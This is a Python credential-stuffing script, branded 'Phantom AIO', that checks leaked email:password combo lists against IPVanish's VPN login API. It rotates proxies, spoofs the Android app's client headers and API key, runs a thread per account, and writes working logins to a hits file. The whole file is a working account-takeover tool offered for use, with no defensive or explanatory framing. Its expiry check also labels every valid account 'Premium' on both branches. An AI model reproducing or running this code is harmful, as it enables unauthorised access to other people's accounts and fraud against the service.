from time import sleep
import os
import sys
import ctypes
import time
import datetime
from random import randint, choice
from uuid import uuid4
import threading
from concurrent.futures import ThreadPoolExecutor
from requests import Session
from colorama import Fore, Style

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT

valid = 0
invalid = 0
custom = 0
proxy_error = 0
total_ver = 0
accounts_processed = 0

print()

start_time = time.time()
ctypes.windll.kernel32.SetConsoleTitleW(f'『 Phantom AIO 』 ~ IPVanish Checker | Valid : {valid} | Invalid : {invalid} | Proxy Error : {proxy_error}')

def update_console_title():
    global valid, invalid, proxy_error, start_time, accounts_processed
    current_time = time.time()
    elapsed_time = current_time - start_time
    cpm = int((accounts_processed / elapsed_time) * 60)
    ctypes.windll.kernel32.SetConsoleTitleW(f'『 Phantom AIO 』 ~ IPVanish Checker | Valid : {valid} | Invalid : {invalid} | Proxy Error : {proxy_error} | CPM : {cpm}')

def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

def get_number(min: int, max: int):
    return randint(min, max)

def load_combos():
    with open("combos.txt", "r", encoding="utf-8", errors="ignore") as file:
        combos = []
        for line in file:
            combo = tuple(line.strip().split(":"))
            if len(combo) == 2:
                combos.append(combo)
            else:
                print(f"Warning: Ignoring malformed combo - {line.strip()}")
    return combos

def load_proxies():
    with open("proxies.txt", "r") as file:
        proxies = [line.strip() for line in file]
    return proxies

def get_proxy(proxies):
    proxy = choice(proxies)
    parts = proxy.split(':')

    if len(parts) == 2:
        ip, port = parts
        return {'https': f'http://{ip}:{port}'}
    elif len(parts) == 4:
        ip, port, user, password = parts
        return {'https': f'http://{user}:{password}@{ip}:{port}'}
    else:
        print(f"Invalid proxy format for: {proxy}. Skipping this proxy.")
        return None

def checker(email, password):
    global valid, invalid, custom, proxy_error, accounts_processed
    retry_count = 0

    while retry_count < 5:
        with Session() as s:
            proxy = choice(open("proxies.txt", "r").readlines()).strip() if len(
                open("proxies.txt", "r").readlines()) != 0 else None

            session = Session()

            proxy = (choice(open("./proxies.txt", "r").readlines()).strip()
                    if len(open("./proxies.txt", "r").readlines()) != 0
                    else None)
            if ":" in proxy and len(proxy.split(":")) == 4:
                ip, port, user, pw = proxy.split(":")
                proxy_string = f"http://{user}:{pw}@{ip}:{port}"
            else:
                ip, port = proxy.split(":")
                proxy_string = f"http://{ip}:{port}"

            session.proxies = {
                "http": proxy_string,
                "https": proxy_string
            }
            data = {
                "api_key": "15cb936e6d19cd7db1d6f94b96017541",
                "client": f"Android-3.4.6.7.{get_number(100000000, 1000000000)}",
                "os": "30",
                "password": password,
                "username": email,
                "uuid": str(uuid4())
            }
            headers = {
                "Content-Type": "application/json",
                "X-Client": "ipvanish",
                "X-Client-Version": "1.2.",
                "X-Platform": "Android",
                "Connection": "Keep-Alive",
                "User-Agent": "okhttp/3.12.0",
                "Accept-Encoding": "gzip, deflate"
            }
            try:
                response = session.post("https://api.ipvanish.com/api/v3/login", json=data, headers=headers)
                if "The username or password provided is incorrect" in response.text or "failed attempts" in response.text:
                    invalid += 1
                    accounts_processed += 1
                    update_console_title()
                    time_rn = get_time_rn()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
                    return
                elif "account_type" not in response.text:
                    raise Exception("Invalid response format")
                expire = int(datetime.datetime.utcfromtimestamp(response.json()["sub_end_epoch"]).strftime('%Y%m%d'))
                now_time = int(datetime.datetime.now().strftime('%Y%m%d'))
                if now_time > expire:
                    time_rn = get_time_rn()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}|{pink} {email}{gray}:{pink}{password}{gray} | {green}Premium")
                    valid += 1
                    accounts_processed += 1
                    update_console_title()
                    if not os.path.isdir("Checked/IPVanish"):
                        os.mkdir("Checked/IPVanish")
                    with open("Checked/IPVanish/ipvanish_premium.txt", "a") as file:
                        file.write(f"{email}:{password}\n")
                else:
                    time_rn = get_time_rn()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}|{pink} {email}{gray}:{pink}{password}{gray} | {green}Premium")
                    valid += 1
                    accounts_processed += 1
                    update_console_title()
                    if not os.path.isdir("Checked/IPVanish"):
                        os.mkdir("Checked/IPVanish")
                    with open("Checked/IPVanish/ipvanish_premium.txt", "a") as file:
                        file.write(f"{email}:{password}\n")
                break
            except Exception as e:
                proxy_error += 1
                update_console_title()
                checker(email, password)

accounts = []

with open('combos.txt', 'r', errors='ignore') as file:
    for line in file:
        if ':' in line:
            email, password = line.rsplit(':', 1)
            accounts.append((email.strip(), password.strip()))

def process_account(email, password):
    checker(email, password)

def start_threads():
    threads = []
    for email, password in accounts:
        thread = threading.Thread(target=process_account, args=(email, password))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

max_threads = 500

start_threads()